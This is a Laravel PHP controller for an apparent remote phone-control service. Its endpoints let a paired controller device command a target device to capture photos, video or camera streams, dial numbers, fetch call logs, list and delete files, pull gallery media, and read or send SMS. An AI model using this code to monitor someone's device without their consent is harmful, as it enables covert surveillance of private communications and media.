<?php

namespace App\Http\Controllers;

use App\Models\Device;
use App\Models\Command;
use App\Events\CommandEvent;
use Illuminate\Http\Request;
use App\Events\AdminStatsUpdated;
use App\Services\FirebaseService;
use App\Events\AdminCommandCreated;
use Illuminate\Support\Facades\Auth;

class AccessController extends Controller
{
    protected $firebase;

    public function __construct(FirebaseService $firebase)
    {
        $this->firebase = $firebase;
    }

    private function sendCommand($action, $target, $controller, $payload = [])
    {
        $command = Command::create([
            'from_device_id' => $controller->id,
            'to_device_id' => $target->id,
            'action' => $action,
            'payload' => json_encode($payload),
            'status' => 'pending',
        ]);

        event(new AdminCommandCreated($command));
        event(new AdminStatsUpdated(getCurrentStats()));

        // Broadcast via Reverb (WebSocket)
        event(new CommandEvent($command));

        // Firebase push fallback
        if ($target->fcm_token) {
            $this->firebase->sendPush($target->fcm_token, [
                'type' => 'command',
                'command_id' => $command->id,
                'action' => $action,
            ]);
        }

        return $command;
    }

    public function completeCommand(Request $request)
    {
        $request->validate(['command_id' => 'required|exists:commands,id']);

        $command = Command::findOrFail($request->command_id);
        $command->update([
            'status' => 'completed',
            'result' => $request->result ?? null,
        ]);

        // ADD THESE 2 LINES → Updates status + counters instantly
        event(new \App\Events\AdminCommandUpdated($command));
        event(new \App\Events\AdminStatsUpdated(getCurrentStats()));

        return response()->json(['message' => 'Command completed']);
    }

    private function validateAndGetDevices(Request $request)
    {
        $request->validate([
            'target_device_id' => 'required|exists:devices,id',
        ]);

        $user = Auth::user();
        $controller = $user->devices()->where('role', 'controller')->first();

        if (!$controller) {
            abort(403, 'No controller device registered.');
        }

        $target = Device::find($request->target_device_id);

        if ($target->paired_to !== $controller->id) {
            abort(403, 'Device not paired with your controller.');
        }

        return [$controller, $target];
    }

    // ========================================
    // 1. CAMERA ACCESS
    // ========================================
    public function camera(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'type' => 'required|in:photo,video,stream',
        ]);

        $payload = [
            'type' => $request->type,
        ];

        $command = $this->sendCommand('camera_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    // ========================================
    // 2. CALL ACCESS
    // ========================================
    public function call(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:dial,get_logs',
            'number' => 'nullable|string|required_if:action,dial',
        ]);

        $payload = [
            'action' => $request->action,
        ];

        if ($request->action === 'dial') {
            $payload['number'] = $request->number;
        }

        $command = $this->sendCommand('call_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    // ========================================
    // 3. FILE ACCESS
    // ========================================
    public function file(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:list,download,upload,delete',
            'path' => 'nullable|string',
            'file_id' => 'nullable|string', // For upload response
        ]);

        $payload = [
            'action' => $request->action,
            'path' => $request->path ?? '/',
        ];

        $command = $this->sendCommand('file_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    // ========================================
    // 4. GALLERY ACCESS
    // ========================================
    public function gallery(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:list,download',
            'media_type' => 'nullable|in:photo,video', // Optional filter
        ]);

        $payload = [
            'action' => $request->action,
            'media_type' => $request->media_type,
        ];

        $command = $this->sendCommand('gallery_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    // ========================================
    // 5. MESSAGE ACCESS
    // ========================================
    public function message(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:send,read,inbox',
            'to' => 'nullable|string|required_if:action,send',
            'text' => 'nullable|string|required_if:action,send',
            'thread_id' => 'nullable|integer',
        ]);

        $payload = ['action' => $request->action];

        if ($request->action === 'send') {
            $payload['to'] = $request->to;
            $payload['text'] = $request->text;
        }

        if ($request->action === 'read') {
            $payload['thread_id'] = $request->thread_id;
        }

        $command = $this->sendCommand('message_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }
}
